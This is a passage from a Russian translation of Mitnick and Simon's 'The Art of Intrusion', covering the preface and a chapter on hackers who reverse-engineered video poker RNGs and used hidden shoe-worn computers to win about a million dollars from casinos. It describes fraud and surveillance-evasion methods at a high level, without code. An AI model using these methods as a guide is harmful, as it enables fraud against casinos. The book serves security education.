Аннотация: Истории, рассказанные в этой книге, демонстрируют, как небезопасны все компьютерные системы, и как мы уязвимы перед подобными атаками. Урок этих историй заключается в том, что хакеры находят новые и новые уязвимости каждый день. Читая эту книгу, думайте не о том, как изучить конкретные уязвимости тех или иных устройств, а о том, как изменить ваш подход к проблеме безопасности и приобрести новый опыт.  Если вы профессионал в области информационных технологий или обеспечения безопасности, каждая из историй станет для вас своеобразным уроком того, как повысить уровень безопасности в вашей компании. Если же вы не имеете отношения к технике и просто любите детективы, истории о рисковых и мужественных парнях — вы найдете их на страницах этой книги.   ---------------------------------------------    Кевин Митник, Вильям Саймон    Искусство вторжения      Предисловие     Все хакеры — и самые молодые и не очень — постоянно соревнуются друг с другом. Один из крупных призов в этом соревновании — возможность похвалиться проникновением на Интернет-сайт моей (Кевина Митника) компании, занимающейся безопасностью, или же на мой сайт.  Другой приз — хакерская история, рассказанная мне или моему соавтору Биллу Саймону так убедительно, чтобы мы, поверив в ее истинность, включили ее в эту книгу.  Все это представляло собой увлекательное занятие, игру умов, которой мы предавались долгое время, проводя многочисленные интервью для написания этой книги. Для большинства журналистов и авторов установление личности говорящего — дело совсем простое: действительно ли это тот человек, за которого себя выдает? Действительно ли он работает на ту компанию. о которой говорит? Действительно ли он занимает в ней тот пост, на который претендует? Есть ли у него документальные подтверждения рассказанной истории, и могу ли я удостовериться в их подлинности? Есть ли заслуживающие доверия свидетели всей его истории или хотя бы ее части?  Для хакеров ответить на эти простые вопросы совсем не так легко. Большинство из людей, чьи истории приведены в этой книге (за исключением тех немногих, кто уже сидит в тюрьме), должны были бы подвергнуться судебному преследованию, если бы их личность была установлена. Поэтому не надо пытаться узнать подлинные имена рассказчиков или искать доказательства изложенных фактов.  Все эти люди поделились своими историями только потому, что полностью доверяли мне. Они знали, что на меня можно положиться, и я их не предам. Именно поэтому, несмотря на весь риск, они рассказали о своих хакерских «достижениях».  Тем не менее, нельзя забывать о том, что рассказчики иногда кое-что преувеличивают, — для большей убедительности, а может быть, и вся история — выдумка, но построена на таких правдивых деталях, что выглядит правдой.  Осознавая, что такой риск есть, в процессе всех интервью я проверял достоверность каждой детали, требуя подробных доказательств тому, что вызывало хоть какое-то подозрение. и требуя повторных рассказов, чтобы удостовериться, что рассказанная второй раз история звучит в точности так же, как и в первый. У меня подозрения вызывало даже то, что рассказчик порой не мог вспомнить важные детали, или же объяснить, как он попал из точки А в точку В.  Если я специально не оговариваю в какой-то части истории, что она выдумана, значит — это правда. Мы с моим соавтором включили в эту книгу только истории тех рассказчиков, кому могли доверять. Тем не менее, мы часто меняли некоторые детали, чтобы защитить не только хакеров, но и их жертвы.  В то же время надо понимать, что производители ПО и оборудования постоянно повышают уровень безопасности, поэтому большинство из описанных здесь «лазеек» в системах безопасности уже устранены. Это может породить иллюзию того, что поскольку они устранены, то читателям и их компаниям не о чем беспокоиться. Однако мораль этих, историй, независимо от того, произошли они шесть месяцев или шесть лет назад, заключается в том, что хакеры находят новые и новые лазейки каждый день. Читая эту книгу, думайте не о том, чтобы изучить конкретные уязвимые места тех или иных устройств. а как изменить ваш подход к проблеме безопасности и приобрести новый опыт.  Думаю, в процессе чтения книги вы испытаете удивление, восторг и даже восхищение фантастическими ухищрениями этих невероятно изобретательных хакеров.  Некоторые из них могут вас шокировать, другие — откроют глаза, а третьи — заставят рассмеяться над находчивостью этих ребят. Если вы профессионал в области информационных технологий (ИТ) или обеспечения безопасности, каждая из историй станет для вас своеобразным уроком того, как повысить уровень безопасности в вашей компании. Если же вы не имеете отношения к технике и просто любите детективы, истории о рисковых и мужественных парнях, то все это вы найдете на страницах этой книги.  В каждой из рассказанных историй ее герои постоянно существуют под страхом того, что полицейские или агенты службы безопасности постучат в дверь с наручниками наготове. И довольно часто именно так и происходит.  Для тех, кому повезло, остается возможность попадать в новые истории. Как правило, участники событий, описанных в этой книге, никогда о них не рассказывали. Большинство из приключений, о которых вы прочтете, видят свет впервые.       Глава 1.    Ограбление   казино   на миллионы   долларов      Как только кто-то скажет: «Ни у кого не возникнет желания ввязываться в проблемы, чтобы сделать это», как появятся несколько финских ребятишек, которые как раз и захотят ввязаться в эти проблемы.      Алекс Майфилд   В судьбе игрока всегда наступает такой момент, когда нервное напряжение материализуется в нечто реальное, азарт берет верх над осторожностью, и рулетка в казино становится похожа на гору, ждущую, чтобы ее покорили. В такой момент идея обхитрить рулетку или игральный автомат кажется вполне осуществимой.  Алекс Майфилд и три его приятеля сделали то, о чем многие могли бы только мечтать. Как и многие другие хакеры, они начали с простых мысленных упражнений и проверки их на правдоподобность. В конце концов, они победили систему казино и «облегчили» его, по словам Алекса, примерно на миллион долларов.  В начале девяностых годов все четверо работали консультантами в сфере высоких технологий и считали свою жизнь скучной и обычной. «Что такое жизнь: вы работаете, зарабатываете деньги, потом перестаете работать и, наконец — умираете».  Лас-Вегас был от них очень далек, — где-то в кинофильмах и телевизионных шоу. Поэтому, когда им предложили разработать некоторое ПО и затем представить его на выставке в Лас-Вегасе, они с удовольствием согласились. Для каждого из них это был первый визит в Лас-Вегас, причем за чужой счет — кто откажется от этого? Отдельные номера для каждого из них в одном из лучших отелей Лас-Вегаса позволяли Алексу взять с собой жену, а Майку — подружку. Таким образом, две пары плюс Ларри и Марко готовились хорошо провести время в этом «городе греха».  По словам Алекса, они мало что знали об азартных играх и не знали, чего ждать от Лас-Вегаса: « В ы выходите из самолета и видите старушек, играющих в игральные автоматы, и постепенно заражаетесь всем этим»…  …После того как выставка завершилась, они сидели все вместе с двумя своими дамами в игровом зале своего отеля, поигрывали в автоматы и потягивали пиво, когда жена Алекса произнесла роковую фразу:  — Ребята, ведь эти машины построены на основе компьютеров. а вы — специалисты по компьютерам, так почему вы не можете сделать так, чтобы мы выигрывали почаще?  Ребята тут же направились в номер Марка и уселись в кружок, рассуждая о том, как могут быть устроены игральные автоматы.   ИССЛЕДОВАНИЕ   Как говорится, процесс пошел. «Идея буквально втемяшилась в четыре наши головы и, вернувшись домой, мы начали ее обсуждать», — с удовольствием вспоминает Алекс эту креативную стадию всей истории. Очень быстро исследователи утвердились в своих начальных подозрениях: «Действительно, игральные автоматы основаны на компьютерных программах. Поэтому мы стали обдумывать способы взлома этих машин».  Есть люди, которые побеждают игральные автоматы, «заменяя программу», то есть, добираясь до компьютерного чипа в автомате и заменяя ПО на ту версию, которая будет выплачивать им большие выигрыши, чем предусматривает казино. Другие преуспевают в своем мошенничестве при помощи техника, обслуживающего автоматы. Для Алекса с приятелями такое грубое вмешательство в жизнь автомата было похоже на то, «как если бы мы ударили старушку по голове и отобрали у нее кошелек». Они рассматривали свою будущую «схватку» с казино, как своеобразный вызов своему интеллекту и программистским способностям. Кроме того, ни у кого из них не было талантов социального инженера — они были компьютерными специалистами и не знали, как втереться в доверие к сотруднику компании и убедить его реализовать схему изъятия некоторой суммы денег у казино.  Однако, как подступить к проблеме? Вот что вспоминает Алекс: «Мы рассуждали о том, как мы могли бы предсказать возможные последовательности выпавших карт. Или же, о том, как отыскать „черный ход“ (программное обеспечение, дающее возможность несанкционированного доступа к программе), который некоторые программисты могут использовать в своих целях. Все программы пишутся программистами, а программисты такие же люди, как и все мы. Мы думали о том, как можно было бы пробраться через заднюю дверь, нажимая определенный набор клавиш, или же отыскать определенные просчеты программистов, которые можно было бы использовать в своих интересах».  Алекс прочел в свое время книгу «The Eudaemonic Pie» Томаса Басса (Penguin, 1992), — историю о том, как компания компьютерщиков и физиков в восьмидесятые годы обыграла рулетку в Лас-Вегасе при помощи собственного изобретения — переносного компьютера размером с пачку сигарет, который предсказывал цифры, которые выкидывала рулетка. Один из членов команды находился около стола и определял скорость вращения колеса рулетки и движения шарика по ней, а компьютер затем передавал по радио информацию другому члену команды, который делал соответствующую ставку. Они хотели забрать чемоданы денег, но им это не удалось. По мнению Алекса «у методики этих ребят был большой потенциал, но он не реализовался из-за достаточно сложной и ненадежной технологии. Кроме того, в игре принимали участие слишком много человек, поэтому вставала проблема их контактов и взаимоотношений. Мы не должны были повторить их ошибок».  По мнению Алекса, победить компьютерную игру проще, «поскольку действия компьютера полностью предопределены заложенной в него программой» — каждое последующее действие основано на результате предыдущих, можно выразить это в таком девизе: «хорошие данные на входе — хорошие данные на выходе» (на самом деле, пословица компьютерных инженеров звучит так: «мусор на входе — мусор на выходе»).  С этими выводами были согласны и партнеры Алекса. Между прочим, Алекс был самым молодым из членов команды, он играл в рок-группе и мечтал о карьере рок-звезды. Только после того, как эти мечты не сбылись, он занялся математикой. У него был настоящий талант к математике и, хотя он не утруждал себя лекциями и семинарами (его даже выгнали из колледжа), он изучил предмет настолько, что был в нем настоящим авторитетом.  Он решил, что имеет смысл провести серьезное исследование и отправился в Вашингтон, чтобы изучить патенты в библиотеке Патентного общества. «Я подумал, что автор патента мог быть настолько глупым, чтобы поместить в него подробный текст программы для автомата для игры в покер». Оказалось, что он был прав. «Помещение полного текста всех программ в патент было единственным способом зашиты оригинальности своего изобретения, поскольку именно они и содержали подробное описание сути изобретения, правда. в форме, которая была непонятна большинству читателей. Никакого труда не составило получить микрофильмы со всеми кодами и скопировать их».  Анализ кодов помог выявить несколько деталей, которые они сочли интересными, но все пришли к выводу, что только работа с конкретными автоматами может приблизить их к желаемому результату.  Кстати, ребята отлично подходили для командной работы. Майк был очень способным программистом, гораздо более сильным в сфере дизайна оборудования, чем три его приятеля. Марко — еще один сильный программист, был эмигрантом из Восточной Европы и выглядел тинейджером. но обладал совершенно дьявольской изобретательностью. Алекс хорошо разбирался в программировании и был единственным, кто знал криптографию, очень нужную им. Ларри не слишком хорошо знал программирование, и не слишком хорошо двигался из-за последствий мотоциклетной аварии, но он был прекрасным организатором, который мог отслеживать все стадии проекта, фокусируясь на том, кто и что должен сделать в тот или иной конкретный момент.  После первой исследовательской стадии проекта казалось, что Алекс к нему охладел, а Марко, наоборот, воодушевился. Он повторял: «Я не вижу большой проблемы: есть тринадцать штатов, где мы вполне легально можем приобрести игральный автомат». В конце концов, он уговорил всех остальных: « М ы решили, что можем рискнуть'. Каждому пришлось внести свою долю на необходимые транспортные расходы и покупку автомата. Они еще раз отправились в Лас-Вегас, но на этот раз за собственный счет.  Алекс говорил: «Чтобы купить игровой автомат, надо предъявить документ с регистрацией в том штате США. где приобретение игровых автоматов — вполне законное дело. При наличии водительских прав, выданных в таком штате, все должно было пройти гладко». Оказалось, что у одного из участников команды то ли дядя его знакомой девушки, то ли кто-то еще жил в Лас-Вегасе.  Для переговоров с этим человеком команда выбрала Майка, поскольку у него были самые хорошие манеры и вообще — он имел представительную внешностью. «Подобные покупки всегда были подозрительным делом, как и нелегальное приобретение оружия», — поясняет Алекс. Игровые автоматы часто приобретают нечестным путем — по незаконным каналам — чтобы использовать их в клубах и других местах. И, тем не менее, к его удивлению, такой автомат удалось купить.  За автомат японского производства пришлось заплатить 1500 долларов. «Мы поместили его на заднее сидение автомобиля и повезли домой так бережно, как будто у нас в машине был ребенок».   РАЗРАБОТКА   ПРЕСТУПЛЕНИЯ   Майк, Алекс и Марко втащили автомат на второй этаж, и разместили в свободной спальне. Удивительное волнение перед началом работы с автоматом, по словам Алекса, запомнилось всем, как один из поворотных моментов в жизни.  «Мы открыли его, вытащили из него чипы памяти и процессор. Я подумал, что при производстве автомата на заводе крупной корпорации инженеры и сборщики вполне могли работать в режиме конвейера и потому быть немного ленивыми или невнимательными, они использовали чип 6809, аналогичный чипу 6502, который использовался в компьютерах Apple II или Atari. Это был 8-битный чип с размером памяти 64К. Он был хорошо знаком мне».  Машина, которую приобрели будущие хакеры, была одна из тех, что использовалась в игровом бизнесе уже около десяти лет. Если какое-то казино хочет приобрести автомат новой конструкции, то комиссия по играм Лас-Вегаса должна тщательно изучить его программное устройство и убедиться в том, что его выплаты организованы таким образом, что никто не будет обижен — ни игроки, ни казино. Процесс одобрения нового автомата — долгое и нелегкое дело, поэтому казино стараются держаться за старые автоматы столько, сколько это возможно. Это играло на руку нашей команде хакеров, потому что они справедливо надеялись, что более старые автоматы будут основаны на устаревшей технологии, которую им легче будет победить.  Компьютерная программа, которую исследователи обнаружили в чипе, состояла из череды нулей и единиц, то есть самого общего вида компьютерных инструкций. Перед тем, как приступить к изменению программы, надо было совершить, так сказать, «ретрансляцию», — операцию, которую совершают инженеры и программисты, когда хотят воссоздать процесс создания того или иного продукта: в данном случае это означало перевод программных нулей и единиц в форму, с которой могут оперировать программисты.  Для совершения этой операции Алексу был нужен «антиассемблер». Наша четверка не хотела приобретать эту программу законным путем, потому что это действие выглядело бы, как запрос в библиотеку о руководстве по изготовлению бомб. Ребятам пришлось написать собственный антиассемблер, Алекс описал этот процесс такими словами: «Это, естественно, была не легкая прогулка, но мы получили от этого занятия немало удовольствия».  После того, как компьютерные коды программы из покерного автомата были пропущены через новый антиассемблер, три программиста сели над ними, чтобы вникнуть в их суть. Обычно для профессионального программиста не составляет особого труда быстро отыскать в программе интересующие его секции. Так происходит, потому что программист, пишущий программу, расставляет на всем ее протяжении своеобразные «дорожные знаки» — метки, комментарии и объяснения того, как действует каждый из разделов. Это похоже на книгу, в которой есть заголовки частей, разделов, глав, а иногда и более мелких частей.  При переводе программы в цифровую форму, которую компьютер может понять, эти «дорожные знаки» игнорируются — ни компьютеру. ни микропроцессору они совершенно не нужны.  Поэтому, когда программа восстанавливается из машинных кодов при помощи антиассемблера, в ней нет ни одного традиционного пояснения; продолжая метафору «дорожных знаков», такой восстановленный код можно сравнить с картой, на которой нет названий населенных пунктов и маркировки дорог.  Наши исследователи тщательно изучали страницы кодов на экране, стараясь отыскать ответ на простые вопросы: «Какова логика программы? Каким образом перемешиваются карты перед выбросом? Как фиксируется замена карт?» Но главной задачей на этом этапе был поиск генератора случайных чисел. Алекс предполагал, что японские программисты, написавшие программу, вполне могли допустить незначительные ошибки в написании этого самого генератора, он не ошибся.   ПЕРЕПИСЫВАНИЕ   КОДА   Алекс с гордостью описывал усилия команды на этом этапе: « М ы были профессиональными программистами, и все сделали хорошо. Мы выяснили, как цифры кода программы превращаются в карты на табло игрального автомата, а затем написали небольшую добавку на языке С, которая делала то же самое», — говорил он.  «У нас был стимул для работы, и мы работали ночи напролет. Нам потребовалось около трех недель, чтобы досконально разобраться в том, как работает программа.  Для этого мы изучали текст, делали определенные предположения о его назначении, писали некоторые добавки к программе, помещали ее в R O M (компьютерный чип) и возвращали его в машину, а потом смотрели, что происходит. Например, мы написали специальную программу, которая располагала числа над изображением карт на экране. Так мы определили, каким образом программа оперирует с картами. Н а ш а работа ш л а по м е т о д у проб, ошибок, и постоянного анализа, достаточно быстро строки кода начали наполняться смыслом. Мы досконально разобрались в том, как числа в компьютерной программе превращаются в карты на экране.  Мы надеялись, что генератор случайных чисел будет устроен достаточно просто. Дело происходило в начале девяностых годов, и это было именно так. После небольшого анализа я понял, что мы имеем дело с генератором, который Дональд К н у т написал е щ е в 60-е годы. Авторы программы для игрового автомата не стали изобретать велосипед, а просто скопировали в свою программу имеющиеся разработки по методу Монте-Карло.  Мы точно установили, какой алгоритм использовали авторы программы в своем коде для случайной выборки карт; он назывался линейным регистром сдвига с обратной связью (linear feedback shift register) и это был очень хороший генератор случайных чисел (RNG)».  Очень скоро «взломщики» поняли, что в этом генераторе случайных чисел есть очень серьезная «прореха», которая существенно упрощает их задачу. Как объяснял Майк, «это был достаточно простой 32-битный RNG, поэтому взломать его не составляло особого труда, а с помощью нескольких хороших оптимизаций стало совсем просто».  Итак, выдаваемые генератором числа не были абсолютно произвольными. Но, по мнению Алекса, есть серьезная причина для этого:  «Если они абсолютно произвольны, то не могут создавать неравные условия. Они не знают о том, что такое неравные условия. Некоторые автоматы выдают один за другим два последовательных королевских флэша (очень редкую комбинацию карт в покере — прим. переводчика). Такого не должно быть никогда. Поэтому дизайнеры хотят быть уверены, что у них правильная статистика, иначе им кажется, что они теряют контроль над игрой.  Одна вещь, которую дизайнеры не понимали, когда создавали свой автомат, заключается в том, что им и не нужен настоящий генератор случайных чисел. В любом покерном розыгрыше участвуют десять карт: пять сдаются сначала и еще пять для замены каждой из пяти по желанию игрока, В автомате эти десять карт выбирались, как десять последовательных случайных чисел в RNG».  Итак, Алекс и его партнеры поняли, что программа в том автомате, который они изучали, недостаточно продумана. Из-за наличия ошибок стало ясно, что они могут написать несложный, но элегантный алгоритм, который поможет им победить машину.  Идея, по мнению Алекса, заключалась в том, чтобы начать игру, увидеть, какой набор карт выбросил автомат, и ввести эти сведения в свой компьютер. Затем с помощью разработанного алгоритма вычислить положение, в котором находится генератор случайных чисел, и определить, сколько ему еще номеров осталось до того, как будет выброшена комбинация, соответствующая королевскому флэшу.  «Итак, мы работали на нашей тестовой машине и пробовали нашу маленькую программу, которая точно предсказывала нам следующие последовательности карт. Возбуждение нарастало».  Алекс приписывает это возбуждение «осознанию того, что вы умнее кого-то и можете переиграть его. А в нашем случае еще и заработать немного денег».  Они отправились в магазин, отыскали там наручные часы Casio с возможностью отсчета десятых долей секунды и приобрели сразу три штуки для всех троих, кто собирался быть в казино: Ларри должен быть оставаться у компьютера.  Они были готовы начать проверку своего метода. Один из команды должен был начать игру и фиксировать набор карт, которые ему выбрасывал автомат — масть и старшинство каждой из пяти карт. Ларри вводил бы эти данные в их собственный компьютер; хотя их машина и не принадлежала к известным брэндам, это был очень приличный компьютер для их целей, поскольку его процессор был во много раз быстрее тех, что использовались в японских игральных автоматах. Всего за несколько мгновений он вычислял точный момент времени, который должен быть установлен в один из секундомеров Casio.  Когда отсчет времени заканчивался, человек у игрового автомата должен был нажать кнопку «Игра». Это должно было произойти предельно четко, в течение доли секунды. Но это не было слишком сложной проблемой, как объяснил Алекс.  «Двое из н а с какое-то время занимались музыкой. Е с л и вы музыкант и у вас хорошее чувство ритма,то вы можете нажать кнопку в нужный момент в пределах десяти миллисекунд».  Если бы все сработало так, как предполагалось, то машина должна была выбросить игроку набор из пяти последовательных карт одной масти — королевский флэш.  Наши экспериментаторы попробовали этот трюк на своем автомате и практиковались до тех пор, пока каждый из них не научился добиваться выпадения королевского флэша практически с каждой попытки.  Несколько месяцев они, по словам Марка, «занимались восстановлением программы автомата, определяли, каким образом случайные числа превращаются в карты на экране автомата, установили точно, как и когда выбрасывает числа RNG, изучили все особенности автомата и создали программу, учитывающую все эти особенности, чтобы в любой момент времени знать состояние RNG на часы и даже дни вперед».  Они победили автомат и сделали его своим рабом. Они бросили настоящий хакерский вызов и выиграли. Это знание могло сделать их богатыми.  Как прекрасно было мечтать об этом. Удастся ли им реализовать свои мечты в дебрях казино?   НАЗАД   В   КАЗИНО   —   ВРЕМЯ   ИГРАТЬ   Одно дело совершать любые махинации на автомате, стоящем в безопасном месте. Пробовать их в центре переполненного казино и красть у него деньги — это совсем другая история. Для этого нужны стальные нервы.  Их девушки считали все происходящее забавой. Ребята советовали им надеть обтягивающие шорты и вести себя повеселее — играть, шуметь, кривляться, заказывать выпивку — надеясь, что служба наблюдения казино, следящая за всем происходящим через камеры наблюдения, будет отвлечена веселыми лицами и ужимками. «Поэтому мы поощряли такой стиль поведения, как только могли», — вспоминал Алекс.  Они надеялись, что смогут смешаться с толпой. «Лучшим для такой цели был Макс. У него совершенно незапоминающееся лицо, и они с женой выглядели, как типичные посетители казино».  Алекс описывал сцену так, как если бы все происходило вчера. У Марко и Майка это получалось по-другому: дело в том, что Алекс со своей женой Энни были первыми, кто совершал попытку единоборства с покерным автоматом в казино. Он должен был с высокой точностью знать цикл срабатывания автомата. Одним из способов. которым они старались достичь этого знания, была видеокамера в рюкзаке; в казино надо было направить видеокамеру на экран покерного автомата и некоторое время снимать происходящее на видеокассету. «Это совсем не просто, — вспоминал Алекс, — ориентировать рюкзак в нужном направлении, не видя результата; при этом надо было себя вести естественно, чтобы не выглядеть подозрительно и не привлекать внимания». Майк предпочитал другой, менее сложный, метод: «Временной цикл для неизвестного игрального автомата можно определить, если зафиксировать выбрасываемые им карты всего дважды, но через много часов». При этом он должен быть...   Страницы 16-17 отсутствуют   ...«Я подумал о том. что казино проводит эту проверку из-за тех ребят, которые действительно подменяли программу в автомате. Не представляю, как им удавалось сделать это и не быть пойманными». По мнению Алекса, они применяли методы социальной инженерии, обманывали охрану и давали взятки кому-то в казино. Он подозревал, что они могли подменить даже тот «золотой эталон», с которым сверялись чипы в машине при крупном выигрыше.  Прелесть работы его команды, по мнению Алекса, была в том, что они никоим образом не вмешивались в работу автомата. По их мнению. их подход был куда более гибким.  Естественно, ребята не могли постоянно выигрывать; они были уверены: «в конце концов, кто-то скажет — „Эй, мы уже видели этих ребят“. Мы все время опасались того, что нас поймают».  Кроме боязни быть пойманным за мошенничество, они были озабочены и налоговыми проблемами: любого, кто выигрывал более 1200 долларов, казино просило предъявить документы и докладывало о выигрыше в налоговые органы, Майк вспоминает: « М ы полагали, что налоги автоматически будут вычитаться из выигрыша, если у игрока нет удостоверения личности. Но мы не хотели привлекать к себе внимание. Заплатить налоги не было проблемой, но при этом создавалась запись о том, что вы выиграли большую сумму денег. Мы стали напряженно думать о том. как избежать „засвечивания“.  Надо было искать другой подход. После достаточно короткого периода раздумий они начали разрабатывать новую идею.   НОВЫЙ   ПОДХОД   У ребят тогда было две цели: разработать метод, который позволил бы им гарантированно выигрывать заметные суммы с помощью выигрышных комбинаций в покере, но сделать выигрыши не такими большими, чтобы они привлекали внимание окружающих. И путь к этому выигрышу должен быть совсем незаметным, без постоянной беготни к телефону.  Поскольку в казино есть лишь небольшое число японских автоматов, наша команда обратила свое внимание на гораздо более распространенные американские автоматы. Они приобрели его и разобрали уже испытанным путем и обнаружили, что генерация случайных чисел в нем происходит гораздо более сложным образом: машина одновременно использует два генератора, работающих совместно друг с другом. «Программисты, готовившие этот автомат, были уже осведомлены о возможностях жульничества с простыми генераторами», — пришел к выводу Алекс.  Тем не менее, и в этом случае разработчики автомата сделали фатальную ошибку. «Они прочли статью, в которой говорилось, что вы повысите уровень случайности чисел, если используете второй генератор, но они воплотили идею неправильным образом». Чтобы определить выбрасываемую карту, они складывали число из первого генератора с числом из второго генератора.  Правильно было бы менять число из второго генератора после каждой карты. Конструкторы автомата не сделали этого; они меняли его только перед выбросом каждой пятерки карт, так что к выброшенному числу первого генератора для каждой карты из пятерки прибавлялось одно и то же число из второго генератора.  Для Алекса использование двух генераторов было своеобразным криптографическим вызовом: он вспомнил, что аналогичный прием иногда используется при шифровании текстов. Однако он не помнил, как надо действовать в подобных случаях и для повышения квалификации стал ходить в библиотеку соседнего университета.  «Если бы создатели программ для автоматов читали книги по криптографии более тщательно, они бы не сделали этой ошибки. Кроме того, они более внимательно проверяли бы свою систему на возможность взлома и не оставили нам лазейки.  Любой компьютерный инженер смог бы написать программу и сделать то, что сделали мы, поняв, что от него требуется. Самой сложной частью работы было создание быстродействующего алгоритма, чтобы всего за несколько секунд вы могли понять, что происходит; если создавать такой алгоритм недостаточно тщательно, он мог работать несколько часов перед тем, как выдать решение.  Мы все были хорошими программистами, и работа была существенной частью нашей жизни, поэтому мы все сделали правильно. Но это было совсем не просто».  Я помню, как аналогичную ошибку сделал программист компании Norton (до того, как Symantec купил их), разрабатывавший продукт Diskreet — приложение, которое дает пользователю возможность создавать шифрованные виртуальные драйвы. Разработчики некорректно построили алгоритм — а может, даже сделали это намеренно, и это привело к уменьшению длины ключа шифрования с 56 до 30 бит. Государственный стандарт шифрования использует 56-битный ключ, который считается практически не взламываемым, поэтому Norton гарантировал своим пользователям ощущение защищенности. Из-за ошибки программистов на самом деле данные пользователя шифровались при помощи ключа в 30 бит, а не 56. Даже в те годы 30-битный ключ можно было взломать простым «методом грубой силы» (так называется метод последовательного перебора вариантов —  прим. переводчика). Любой человек, используя этот продукт, ошибочно думал, что он находится в полной безопасности: атакующий вполне мог сломать ключ шифрования достаточно быстро и получить доступ к данным пользователя. Примерно такую же ошибку обнаружили наши ребята и в программе игрального автомата.  Параллельно с работой над компьютерной программой, которая позволила бы им победить новый игральный автомат, ребята заставляли Алекса думать над новой моделью поведения, чтобы не приходилось постоянно бегать к телефону. Ответом стала страница из книги «Endaemonic Pie» — карманный компьютер. Алекс разработал систему, сделанную из миниатюрного компьютера, который Майк и Марко отыскали в каталоге, В этой системе управляющая кнопка была упрятана в ботинок, а для приема сигнала использовался виброзвонок от сотового телефона. «Нам пришлось немало поработать над тем, чтобы построить систему на основе маленького чипа и маленькой памяти», — рассказывает Алекс. « М ы создали прекрасную эргономичную систему, которая помещалась в ботинке». Вероятно, под словом «эргономичный» он подразумевает то, что его устройство было настолько маленьким, что не натирало ногу при ходьбе!   НОВАЯ   АТАКА   Началась отработка новой схемы работы, и это был достаточно нервный процесс. Они избавились от необходимости бегать к телефону перед каждым выигрышем. Но даже после многочисленных тренировок в домашних условиях, «работа» в реальных условиях происходит перед огромной аудиторией, существенная часть которой очень подозрительно к вам относится.  На этот раз программа была разработана так, что ребята могли сидеть у автомата, не отходя от него, осуществляя целую серию небольших менее подозрительных выигрышей. Алекс и Майк вспоминают некоторые непростые моменты в процессе «работы».   Алекс  : «Я обычно помещал свой компьютер в корпус маленького транзисторного приемника. Провод от него шел через носок в ботинок к управляющей кнопке».   Майк  : «Я приматывал провод к лодыжке. Мы изготавливали переключатели из небольших кусочков материала, который используется для изготовления интегральных схем. Эти переключатели были размером два на два сантиметра, с небольшой кнопкой. Затем мы вырезали такого же размера дыру в стельке и помещали переключатель в ботинок. Он доставлял неудобство только в том случае, если вам приходилось целый день носить его — мог натереть пальцы».   Алекс  : «Итак, мы входили в казино и старались выглядеть максимально спокойно, а действовать так, как будто никаких проводов в наших ботинках не было. Мы подходили к автомату и начинали играть. Для передачи сигналов у нас была разработана система, аналогичная азбуке Морзе. Мы начинали играть и передавали значения выпавших карт при помощи кнопки в ботинке.  С и г н а л от э т о й кнопки ш е л в компьютер, лежащий в кармане. Д л я точного определения места, в котором находился генератор случайных чисел, надо было дождаться выброса восьми карт. П я т ь карт автомат выбрасывал для начала игры, а следующие три мы получали, попросив его заменить три карты для продолжения игры».   Майк  : «Наш код для передачи информации о выпавших картах был двоичным, кроме того, он использовал технологию сжатия информации под названием код Хафмана. Например, длинный и короткий сигнал означал один-ноль, то есть два в двоичной системе. Длинный-длинный означал три и т.д. Для обозначения любой карты требовалось не более трех нажатий».   Алекс  : «Нажатие кнопки в течение трех секунд означало прерывание информации. Е с л и компьютер выдавал вам три коротких сигнала — пи-пи-пи — это означало, что вам пора переходить к решительным действиям. Естественно, этому пришлось поучиться, и мы практиковались делать это, например, поддерживая беседу с посетителями или служащими казино. Однажды я передал информацию о восьми картах и получил в ответ через минуту три коротких гудка. Я был готов к действиям.  В этот момент компьютер в кармане обнаружил место в алгоритме, которое соответствовало выкинутым картам. Алгоритм в карманном компьютере был аналогичен алгоритму в игральном автомате, поэтому компьютер в кармане «знал», какие карты будут выброшены автоматом в следующий раз. Поэтому он мог вам дать совет, какие карты надо придержать, а какие — поменять, чтобы получить в результате выигрышную комбинацию, продолжал свой рассказ Алекс:  «Компьютер говорил, что надо делать, посылая сигналы на вибратор в кармане, который мы пристроили к нему, вытащив из старого пейджера. Е с л и компьютер хотел, чтобы вы держали третью и п я т у ю карту, он сигналил бип, бип, би-и-и-п, бип, би-и-и-п, — что вы ощущали, как вибрацию в кармане.  Если играть внимательного вероятность выигрыша при нашей методике возрастала до сорока процентов, в то время как при игре в блэк-джек она не превышала двух с половиной процентов. При нашей методике игры, если вы дважды в минуту заряжали в автомат пятидолларовую монету, то могли выигрывать двадцать пять долларов в минуту. За полчаса вы могли запросто «надуть» автомат на тысячу долларов. Некоторым людям удавалось сделать это абсолютно честно, но таких было не более пяти процентов от общего числа игроков. Причем им далеко не всегда удавалось повторить свой успех в следующие полчаса. А мы попадали в эти пять процентов счастливцев каждый раз».  Когда один из игроков выигрывал достаточно много денег в одном казино, он перемещался в другое. Каждому позволялось за день обходить не более четырех-пяти мест. Когда через месяц они возвращались в то казино, где уже играли, они старались приходить в другое время или дожидались другой смены дежурных, чтобы минимизировать вероятность узнавания. Им пришлось осваивать и другие города— Рено, Атлантик-Сити, — далее везде.  Их постоянные выигрыши стали обычным делом. Наконец Майк решил, что пришел момент, о котором они долго думали, и он перешел к автомату, где ставка составляла 25 долларов. Проблема состояла в том, что наблюдение за этими автоматами велось гораздо тщательнее.  «Естественно, я волновался, но в с е ш л о гладко. Я выиграл около пяти тысяч буквально за несколько минут. И в э т о мгновение один из с л у ж а щ и х с очень внушительным видом положил мне руку на плечо. Я почувствовал, как сердце у меня уходит в пятки — „ Н а ч а л о с ь . . . “  — Я вижу, вы неплохо выиграли, — сказал он. — Какой цвет вам больше нравится — розовый или зеленый?  Господи, что же это значит, судорожно думал я. «Неужели я должен выбрать цвет, до которого они меня будут избивать?» Я был готов отдать весь выигрыш, только бы меня отпустили с миром. Пришлось собрать волю в кулак и продолжить разговор с этим мужчиной. «Мы хотим предложить вам выпить чашку кофе за счет заведения», — сказал тот. Я выбрал зеленую кружку».  Случались напряженные моменты и у Марка. Однажды он сидел, ждал выпадения выигрышной комбинации и не заметил, как служащий подошел и встал у него за спиной. «Парень, ты удваиваешь ставку до пяти тысяч долларов — надо очень сильно верить в свою удачу. чтобы делать это», — сказал он с искренним удивлением. Пожилая женщина из-за соседнего автомата ответила ему сильно прокуренным дребезжащим голосом: «Нет… удача здесь ни при чем». Я почувствовал, как служащий напрягся, почуяв что-то подозрительное. «Он просто настоящий мужик», — проскрипела старая карга. Служащий хмыкнул и отошел от меня.  За три года команда полностью забросила свою законную работу и с успехом применяла свои умения и навыки на новом поприще борьбы с игральными автоматами. Они купили еще два, один из них был самой современной моделью, и продолжили модернизировать свое ПО.  Во время своих путешествий три члена команды старались посещать разные казино, чтобы не работать «коллективом», вспоминает Алекс. «Один или два раза такое все же случалось, и это было очень глупо». Они старались уведомить друг от друга о маршрутах своих передвижений, но 